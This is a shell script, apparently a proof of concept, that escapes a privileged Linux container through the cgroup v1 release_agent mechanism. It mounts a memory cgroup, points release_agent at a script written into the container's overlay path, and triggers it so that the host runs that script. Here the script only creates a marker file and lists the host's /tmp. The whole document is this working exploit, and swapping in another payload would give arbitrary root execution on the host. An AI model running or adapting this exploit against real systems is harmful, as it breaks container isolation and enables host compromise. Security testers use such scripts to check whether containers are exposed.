#!/bin/sh
echo "Mounting new cgroup folder: "
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo "Creating release_agent script: "
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`mount | sed -n 's/.*\perdir=\([^,]*\).*/\1/p'`
echo "Host-path: $host_path"
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "touch /tmp/container-escape-cgroups1-release_agent.txt" >> /cmd
echo "ls /tmp > $host_path/output.txt" >> /cmd
chmod a+x /cmd
echo "Trying to fire release_agent: "
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 5
cat /output.txt